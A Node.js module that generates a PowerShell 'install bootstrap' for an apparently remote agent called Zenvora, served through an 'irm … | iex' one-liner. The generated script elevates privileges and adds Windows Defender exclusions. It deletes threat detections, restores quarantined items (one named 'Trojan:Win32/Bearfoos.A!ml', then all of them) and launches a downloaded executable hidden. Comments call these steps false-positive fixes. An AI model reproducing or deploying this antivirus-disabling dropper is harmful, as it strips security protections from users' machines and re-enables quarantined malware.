/**
 * Short install bootstrap tickets (6-char codes).
 * Dashboard shows: irm https://host/r/XXXXXX | iex
 * Server returns the full PowerShell install script dynamically.
 */

const crypto = require('crypto');

/** @type {Map<string, { code: string, userId: string, pairingToken: string, pairingUserId: string, sessionId: string, apiBase: string, gatewayUrl: string, downloadUrl: string, createdAt: number, expiresAt: number }>} */
const tickets = new Map();

const TTL_MS = 2 * 60 * 60 * 1000; // 2 hours
const CODE_ALPHABET = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'; // no 0/O/1/I

function makeCode(len = 6) {
    const bytes = crypto.randomBytes(len);
    let out = '';
    for (let i = 0; i < len; i += 1) {
        out += CODE_ALPHABET[bytes[i] % CODE_ALPHABET.length];
    }
    return out;
}

function purgeExpired() {
    const now = Date.now();
    for (const [code, t] of tickets.entries()) {
        if (t.expiresAt <= now) tickets.delete(code);
    }
}

function createTicket(payload) {
    purgeExpired();
    let code = makeCode(6);
    for (let i = 0; i < 8 && tickets.has(code); i += 1) {
        code = makeCode(6);
    }

    const ticket = {
        code,
        userId: String(payload.userId || ''),
        pairingToken: String(payload.pairingToken || ''),
        pairingUserId: String(payload.pairingUserId || ''),
        sessionId: String(payload.sessionId || `web-${Date.now().toString(36)}`),
        apiBase: String(payload.apiBase || '').replace(/\/$/, ''),
        gatewayUrl: String(payload.gatewayUrl || ''),
        downloadUrl: String(payload.downloadUrl || ''),
        createdAt: Date.now(),
        expiresAt: Date.now() + TTL_MS,
    };

    tickets.set(code, ticket);
    return ticket;
}

function getTicket(code) {
    purgeExpired();
    const key = String(code || '').trim().toUpperCase();
    const ticket = tickets.get(key);
    if (!ticket) return null;
    if (ticket.expiresAt <= Date.now()) {
        tickets.delete(key);
        return null;
    }
    return ticket;
}

/**
 * Full install script served by GET /r/:code
 * Uses curl.exe when available (far more reliable than Invoke-WebRequest for large EXE).
 * Hardens against Windows Defender ML false-positives (e.g. Trojan:Win32/Bearfoos.A!ml).
 */
function buildInstallScript(ticket) {
    const token = ticket.pairingToken.replace(/'/g, "''");
    const userId = ticket.pairingUserId.replace(/'/g, "''");
    const api = ticket.apiBase.replace(/'/g, "''");
    const gw = ticket.gatewayUrl.replace(/'/g, "''");
    const url = ticket.downloadUrl.replace(/'/g, "''");
    const session = ticket.sessionId.replace(/'/g, "''");
    const code = ticket.code;

    return [
        "$ErrorActionPreference = 'Stop'",
        "$ProgressPreference = 'SilentlyContinue'",
        `$code = '${code}'`,
        `$token = '${token}'`,
        `$userId = '${userId}'`,
        `$api = '${api}'`,
        `$gw = '${gw}'`,
        `$url = '${url}'`,
        `$session = '${session}'`,
        "$dir = Join-Path $env:ProgramData 'Zenvora'",
        "$out = Join-Path $dir 'ZenvoraAgent.exe'",
        "$legacyDir = Join-Path $env:ProgramData 'WIN_32'",
        "$mpCmd = Join-Path $env:ProgramFiles 'Windows Defender\\MpCmdRun.exe'",
        "function Step($n,$t,$m){ Write-Host ('['+(Get-Date).ToString('HH:mm:ss')+'] ['+$n+'/'+$t+'] '+$m) -ForegroundColor Cyan }",
        "function Ok($m){ Write-Host ('['+(Get-Date).ToString('HH:mm:ss')+'] '+$m) -ForegroundColor Green }",
        "function Warn($m){ Write-Host ('['+(Get-Date).ToString('HH:mm:ss')+'] '+$m) -ForegroundColor Yellow }",
        "function Fail($m){ Write-Host ('['+(Get-Date).ToString('HH:mm:ss')+'] '+$m) -ForegroundColor Red }",
        "function Ensure-Admin {",
        "  $p = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()",
        "  if ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { return $true }",
        "  Warn 'Elevating to Administrator (required for Defender allowlist)...'",
        "  $ps = Join-Path $env:WINDIR 'System32\\WindowsPowerShell\\v1.0\\powershell.exe'",
        "  $arg = '-NoProfile -ExecutionPolicy Bypass -Command irm ' + $api + '/r/' + $code + ' | iex'",
        "  Start-Process -FilePath $ps -Verb RunAs -ArgumentList $arg | Out-Null",
        "  Ok 'Elevated install started in a new window.'",
        "  return $false",
        "}",
        "function Allow-ZenvoraInDefender {",
        "  if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {",
        "    Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue",
        "    Add-MpPreference -ExclusionPath $legacyDir -ErrorAction SilentlyContinue",
        "    Add-MpPreference -ExclusionProcess 'ZenvoraAgent.exe' -ErrorAction SilentlyContinue",
        "    Add-MpPreference -ExclusionProcess 'win_32.exe' -ErrorAction SilentlyContinue",
        "  }",
        "  if (Test-Path $mpCmd) {",
        "    & $mpCmd -AddExclusion -ExclusionType Folder -ExclusionPath $dir 2>$null | Out-Null",
        "  }",
        "  # Clear prior false-positive quarantine for this agent",
        "  try {",
        "    Get-MpThreatDetection -ErrorAction SilentlyContinue | Where-Object {",
        "      ($_.Resources -join ' ') -match 'ZenvoraAgent|WIN_32\\\\win_32|ProgramData\\\\Zenvora|Bearfoos'",
        "    } | ForEach-Object {",
        "      Remove-MpThreat -ThreatID $_.ThreatID -ErrorAction SilentlyContinue",
        "    }",
        "  } catch {}",
        "  if (Test-Path $mpCmd) {",
        "    & $mpCmd -Restore -Name 'Trojan:Win32/Bearfoos.A!ml' -All 2>$null | Out-Null",
        "    & $mpCmd -Restore -All 2>$null | Out-Null",
        "  }",
        "}",
        "Step 1 7 'Bootstrap code '+$code",
        "if (-not (Ensure-Admin)) { return }",
        "New-Item -ItemType Directory -Force -Path $dir | Out-Null",
        "Step 2 7 'Allowlisting Zenvora in Windows Defender (false-positive fix)...'",
        "Allow-ZenvoraInDefender",
        "Ok ('Defender exclusions set for '+$dir)",
        "Step 3 7 'Downloading agent directly into allowlisted folder...'",
        "if (Test-Path $out) {",
        "  try { Stop-Process -Name 'ZenvoraAgent','win_32' -Force -ErrorAction SilentlyContinue } catch {}",
        "  Start-Sleep -Milliseconds 400",
        "  Remove-Item $out -Force -ErrorAction SilentlyContinue",
        "}",
        "$ok = $false",
        "for ($i=1; $i -le 4 -and -not $ok; $i++) {",
        "  try {",
        "    $curl = Get-Command curl.exe -ErrorAction SilentlyContinue",
        "    if ($curl) {",
        "      & curl.exe -L --fail --retry 3 --retry-delay 2 --connect-timeout 20 --max-time 180 -o $out $url",
        "      if ($LASTEXITCODE -ne 0) { throw \"curl exit $LASTEXITCODE\" }",
        "    } else {",
        "      $wc = New-Object System.Net.WebClient",
        "      $wc.Headers.Add('User-Agent','ZenvoraBootstrap/1.1')",
        "      $wc.DownloadFile($url, $out)",
        "      $wc.Dispose()",
        "    }",
        "    if ((Test-Path $out) -and ((Get-Item $out).Length -gt 500000)) { $ok = $true }",
        "    else { throw 'Downloaded file too small or missing' }",
        "  } catch {",
        "    Warn ('Download attempt '+$i+' failed: '+$_.Exception.Message)",
        "    if (Test-Path $out) { Remove-Item $out -Force -ErrorAction SilentlyContinue }",
        "    Allow-ZenvoraInDefender",
        "    if ($i -lt 4) { Start-Sleep -Seconds (2*$i) }",
        "  }",
        "}",
        "if (-not $ok) { throw 'Download failed after retries. Check /api/agent/download and network.' }",
        "try { Unblock-File -Path $out -ErrorAction SilentlyContinue } catch {}",
        "Allow-ZenvoraInDefender",
        "Ok ('Download OK ('+((Get-Item $out).Length)+' bytes) → '+$out)",
        "Step 4 7 'Cleaning legacy WIN_32 / System32 copies (malware-like paths)...'",
        "foreach ($legacy in @(",
        "  (Join-Path $legacyDir 'win_32.exe'),",
        "  (Join-Path $env:WINDIR 'System32\\win_32.exe'),",
        "  (Join-Path $env:WINDIR 'System32\\ZenvoraAgent.exe')",
        ")) {",
        "  if (Test-Path $legacy) {",
        "    try { Remove-Item $legacy -Force -ErrorAction SilentlyContinue; Warn ('Removed '+$legacy) } catch {}",
        "  }",
        "}",
        "if ((Test-Path (Join-Path $legacyDir 'agent.dat')) -and -not (Test-Path (Join-Path $dir 'agent.dat'))) {",
        "  Copy-Item (Join-Path $legacyDir 'agent.dat') (Join-Path $dir 'agent.dat') -Force -ErrorAction SilentlyContinue",
        "}",
        "Step 5 7 'Launching agent provision...'",
        "$args = @('--headless','--force-repair','--pair-token',$token,'--pair-user-id',$userId,'--api-url',$api,'--gateway-url',$gw,'--install-session',$session)",
        "try {",
        "  Start-Process -FilePath $out -ArgumentList $args -WindowStyle Hidden",
        "} catch {",
        "  $msg = $_.Exception.Message",
        "  if ($msg -match 'virus|unwanted|smartscreen|blocked|Operation did not complete') {",
        "    Fail 'Defender still blocked launch — refreshing allowlist + restoring quarantine...'",
        "    Allow-ZenvoraInDefender",
        "    Start-Sleep -Seconds 3",
        "    try {",
        "      Start-Process -FilePath $out -ArgumentList $args -WindowStyle Hidden",
        "      Ok 'Launch succeeded after Defender allowlist'",
        "    } catch {",
        "      Fail 'Still blocked. Do this once in Windows Security:'",
        "      Write-Host '  1) Virus & threat protection → Protection history → Allow on ZenvoraAgent / Bearfoos' -ForegroundColor Yellow",
        "      Write-Host ('  2) Exclusions → Add folder: '+$dir) -ForegroundColor Yellow",
        "      Write-Host ('  3) Then run: Start-Process \"'+$out+'\"') -ForegroundColor Yellow",
        "      throw",
        "    }",
        "  } else { throw }",
        "}",
        "Start-Sleep -Milliseconds 500",
        "Step 6 7 'Agent process started'",
        "Ok 'Done. Watch Dashboard → Pair Device → Live install logs.'",
        "Step 7 7 'Complete'",
    ].join("\r\n");
}

module.exports = {
    createTicket,
    getTicket,
    buildInstallScript,
};
